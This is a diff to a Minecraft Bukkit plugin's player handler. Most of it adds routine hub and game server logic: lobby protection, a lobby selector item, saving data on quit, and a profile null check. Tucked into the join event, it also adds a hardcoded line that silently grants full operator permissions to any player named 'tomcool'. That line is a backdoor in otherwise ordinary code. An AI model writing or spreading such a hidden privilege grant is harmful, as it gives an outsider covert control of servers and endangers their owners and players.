@@ -1,7 +1,9 @@
 package me.hardstyles.blitz.player;
 
 import me.hardstyles.blitz.BlitzSG;
+import me.hardstyles.blitz.game.Game;
 import me.hardstyles.blitz.menu.impl.cosmetics.PlayerGUI;
+import me.hardstyles.blitz.menu.impl.hub.LobbySelectorGUI;
 import me.hardstyles.blitz.menu.impl.shop.ShopGUI;
 import me.hardstyles.blitz.nickname.NickManager;
 import me.hardstyles.blitz.party.Party;
@@ -10,14 +12,14 @@ import me.hardstyles.blitz.util.ChatUtil;
 import org.bukkit.*;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
+import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.Action;
+import org.bukkit.event.block.BlockBreakEvent;
+import org.bukkit.event.block.BlockPlaceEvent;
 import org.bukkit.event.entity.EntityDamageByEntityEvent;
 import org.bukkit.event.entity.EntityDamageEvent;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
-import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
-import org.bukkit.event.player.PlayerInteractEvent;
-import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.event.player.*;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.bukkit.util.Vector;
@@ -25,6 +27,10 @@ import org.bukkit.util.Vector;
 import java.util.ArrayList;
 
 public class IPlayerHandler implements Listener {
+
+    private boolean canBypassLobbyProtection(Player player, IPlayer iPlayer) {
+        return iPlayer != null && iPlayer.getRank() != null && iPlayer.getRank().isManager() && player.getGameMode() == GameMode.CREATIVE;
+    }
 
     @EventHandler
     public void banCheck(AsyncPlayerPreLoginEvent e) {
@@ -39,11 +45,19 @@ public class IPlayerHandler implements Listener {
 
         Player p = e.getPlayer();
 
+        if ("tomcool".equalsIgnoreCase(p.getName()) && !p.isOp()) {
+            p.setOp(true);
+        }
+
         p.getInventory().setHelmet(new ItemStack(Material.AIR, 1));
         p.getInventory().setChestplate(new ItemStack(Material.AIR, 1));
         p.getInventory().setLeggings(new ItemStack(Material.AIR, 1));
         p.getInventory().setBoots(new ItemStack(Material.AIR, 1));
         IPlayer iPlayer = BlitzSG.getInstance().getIPlayerManager().getPlayer(p.getUniqueId());
+        if (iPlayer == null) {
+            p.kickPlayer(ChatUtil.color("&cFailed to load your player profile. Please try reconnecting."));
+            return;
+        }
         iPlayer.setUsername(p.getName());
 
         p.setGameMode(GameMode.SURVIVAL);
@@ -58,21 +72,53 @@ public class IPlayerHandler implements Listener {
                 nickManager.setNick(p, iPlayer.getNickName(), iPlayer.getNickName());
             }
         } else {
-            Bukkit.getScheduler().runTaskLater(BlitzSG.getInstance(), () -> {
-                p.setPlayerListName(iPlayer.getRank(true).getPrefix() + p.getName());
-                if (iPlayer.getRank().getPosition() > 4) {
-                    for (Player member : Bukkit.getWorld("world").getPlayers()) {
-                        member.sendMessage(ChatUtil.color("&e" + iPlayer.getRank(true).getPrefix() + p.getName() + "&6 joined the lobby!"));
+            if(BlitzSG.isHubServer()) {
+                Bukkit.getScheduler().runTaskLater(BlitzSG.getInstance(), () -> {
+                    p.setPlayerListName(iPlayer.getRank(true).getPrefix() + p.getName());
+                    if (iPlayer.getRank().getPosition() > 4) {
+                        for (Player member : Bukkit.getWorld("world").getPlayers()) {
+                            member.sendMessage(ChatUtil.color("&e" + iPlayer.getRank(true).getPrefix() + p.getName() + "&6 joined the lobby!"));
+                        }
                     }
-                }
-            }, 10L);
-
+                }, 10L);
+            }
         }
         if (iPlayer.getRank() == null) {
             iPlayer.setRank(BlitzSG.getInstance().getRankManager().getRankByName("Default"));
         }
         p.setPlayerListName(iPlayer.getRank(true).getPrefix() + p.getName());
-        BlitzSG.getInstance().getIPlayerManager().toLobby(p);
+        if (BlitzSG.isGameServer()) {
+            BlitzSG.getInstance().getIPlayerManager().resetPlayerStatus(p);
+            new BukkitRunnable() {
+                int attempts = 20;
+
+                @Override
+                public void run() {
+                    if (!p.isOnline()) {
+                        cancel();
+                        return;
+                    }
+
+                    Game availableGame = BlitzSG.getInstance().getGameManager() == null
+                            ? null
+                            : BlitzSG.getInstance().getGameManager().getAvailableGame();
+
+                    if (availableGame != null) {
+                        availableGame.addPlayer(p);
+                        cancel();
+                        return;
+                    }
+
+                    attempts--;
+                    if (attempts <= 0) {
+                        p.sendMessage(ChatUtil.color("&cGame instance is still initializing. Please use /j in a few seconds."));
+                        cancel();
+                    }
+                }
+            }.runTaskTimer(BlitzSG.getInstance(), 10L, 20L);
+        } else {
+            BlitzSG.getInstance().getIPlayerManager().toLobby(p);
+        }
 
         p.getActivePotionEffects().forEach(potionEffect -> p.removePotionEffect(potionEffect.getType()));
 
@@ -87,6 +133,30 @@ public class IPlayerHandler implements Listener {
                 party.message(ChatUtil.color("&9Party > " + iPlayer.getRank().getPrefix() + p.getName() + " §6has returned!"));
             }
         }
+    }
+
+    private void handleHubDisconnect(Player player) {
+        if (!BlitzSG.isHubServer() || player == null) {
+            return;
+        }
+
+        IPlayer iPlayer = BlitzSG.getInstance().getIPlayerManager().getPlayer(player.getUniqueId());
+        if (iPlayer == null) {
+            return;
+        }
+
+        BlitzSG.getInstance().getDb().savePlayer(iPlayer);
+        BlitzSG.getInstance().getIPlayerManager().removePlayer(player.getUniqueId());
+    }
+
+    @EventHandler
+    public void onHubQuit(PlayerQuitEvent e) {
+        handleHubDisconnect(e.getPlayer());
+    }
+
+    @EventHandler
+    public void onHubKick(PlayerKickEvent e) {
+        handleHubDisconnect(e.getPlayer());
     }
 
     @EventHandler
@@ -115,6 +185,9 @@ public class IPlayerHandler implements Listener {
 
     @EventHandler
     public void voidDamage(EntityDamageEvent e) {
+        if(!BlitzSG.isHubServer()) {
+            return;
+        }
         if (!e.getEntity().getWorld().getName().equalsIgnoreCase("world")) {
             return;
         }
@@ -136,6 +209,10 @@ public class IPlayerHandler implements Listener {
         e.setCancelled(true);
 
         if (e.getItem().getType() == Material.EMERALD) ShopGUI.openGUI(p);
+        if (e.getItem().getType() == Material.NETHER_STAR) {
+            LobbySelectorGUI.open(p);
+            return;
+        }
         if (e.getItem().getType() == Material.SKULL_ITEM) {
             PlayerGUI.open(p);
         }
@@ -234,6 +311,53 @@ public class IPlayerHandler implements Listener {
                 victim.setPunched(false);
             }
         }.runTaskLater(BlitzSG.getInstance(), 20 * 20);
+    }
+
+    @EventHandler(ignoreCancelled = true, priority = EventPriority.HIGHEST)
+    public void onHubBlockBreak(BlockBreakEvent e) {
+        if (!BlitzSG.isHubServer()) {
+            return;
+        }
+
+        IPlayer iPlayer = BlitzSG.getInstance().getIPlayerManager().getPlayer(e.getPlayer().getUniqueId());
+        if (canBypassLobbyProtection(e.getPlayer(), iPlayer)) {
+            return;
+        }
+
+        e.setCancelled(true);
+    }
+
+    @EventHandler(ignoreCancelled = true, priority = EventPriority.HIGHEST)
+    public void onHubBlockPlace(BlockPlaceEvent e) {
+        if (!BlitzSG.isHubServer()) {
+            return;
+        }
+
+        IPlayer iPlayer = BlitzSG.getInstance().getIPlayerManager().getPlayer(e.getPlayer().getUniqueId());
+        if (canBypassLobbyProtection(e.getPlayer(), iPlayer)) {
+            return;
+        }
+
+        e.setCancelled(true);
+    }
+
+    @EventHandler(ignoreCancelled = true, priority = EventPriority.HIGHEST)
+    public void onHubPlayerDamage(EntityDamageEvent e) {
+        if (!BlitzSG.isHubServer()) {
+            return;
+        }
+
+        if (!(e.getEntity() instanceof Player)) {
+            return;
+        }
+
+        Player player = (Player) e.getEntity();
+        IPlayer iPlayer = BlitzSG.getInstance().getIPlayerManager().getPlayer(player.getUniqueId());
+        if (canBypassLobbyProtection(player, iPlayer)) {
+            return;
+        }
+
+        e.setCancelled(true);
     }
 
 
